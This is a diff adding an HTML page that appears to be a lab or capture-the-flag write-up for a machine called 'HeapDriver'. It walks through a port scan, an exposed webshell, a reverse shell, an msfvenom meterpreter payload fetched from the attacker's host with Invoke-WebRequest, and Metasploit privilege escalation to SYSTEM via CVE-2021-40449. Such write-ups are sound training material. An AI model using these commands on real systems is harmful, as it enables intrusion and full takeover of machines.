@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+    <style>
+        img {
+            max-width: 80%;
+        }
+    </style>
+    <title>HeapDriver</title>
+</head>
+<body>
+    <div class="container">
+        <h1>HeapDriver</h1>
+        <hr>
+
+        <h3>Port Scan</h3>
+        <p>
+            <img src="./imgs/nmap.png" alt="nmap">
+        </p>
+        <p>
+            So we have a few open ports. Let's check out some of them.
+        </p>
+
+        <h3>Port 8000</h3>
+        <p>
+            <img src="./imgs/8000" alt="port 8000">
+            Looks like we have a webshell on port 8000.
+        </p>
+
+        <h3>Getting a Reverse Shell</h3>
+        <p>
+            Set up <code>netcat</code> listener.<br>
+            Get a reverse shell for windows from <a href="revshells.com">revshells.com</a><br>
+            <i>I like to get the base64 one.</i>
+        </p>
+        <p>
+            <img src="./imgs/reverseshell1.png" alt="reverseshell1">
+        </p>
+
+        <h3>Moving to Metasploit</h3>
+        <p>
+            Then I had to move to <code>metasploit</code> so that I have a better shell and can use it for privilege escalation.
+        </p>
+        <p>
+            I had to create a new <code>exe</code> reverse shell with <code>msfvenom</code><br>
+            <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=5555 -f exe -o meterpreter.exe</code>
+        </p>
+        <p>
+            Then, I had to get it on the system.<br>
+            I started my python fileserver:<br>
+            <code>python3 -m http.server</code><br>
+            And got it on the windows system<br>
+            <code>Invoke-WebRequest http://10.10.14.2:8000/shell64.exe -OutFile shell64.exe</code>
+        </p>
+        <p>
+            Now, I have to set up my metasploit listener.<br>
+            <img src="./imgs/metasploit_listener.png" alt="metasploit listener"><br>
+            <img src="./imgs/msfshell.png" alt="msfshell">
+        </p>
+        
+        <h3>Privilege Escalation</h3>
+        <p>
+            Now, when I have my metasploit shell, I can use the metasploit exploit suggester.
+        </p>
+        <p>
+            I am going to use:<br>
+            <code>post/multi/recon/local_exploit_suggester</code>
+            <img src="./imgs/suggester.png" alt="suggester">
+        </p>
+        <p>
+            I did <code>show options</code> to see what I had to specify.<br>
+            <img src="./imgs/session.png" alt="session"><br>
+            Looks like I have to specify a session.
+        </p>
+        <p>
+            To see my sessions there is a command: <code>sessions</code><br>
+            <img src="./imgs/sessions_7.png" alt="session 7">
+        </p>
+        <p>
+            <code>set session 7</code><br>
+            <code>run</code>
+        </p>
+        <p>
+            The suggester did find a bunch of exploits that we can use.<br>
+            <img src="./imgs/40449.png" alt="cve-2021-40449">
+        </p>
+        <p>
+            I am going to use the one I highlighted.
+        </p>
+        <p>
+            I set up the session again and a new port.
+        </p>
+        <p>
+            And eventually got my new session and became <code>nt authority\system</code><br>
+            <img src="./imgs/nt.png" alt="nt authority\system">
+        </p>
+         
+    </div>
+</body>
+</html>
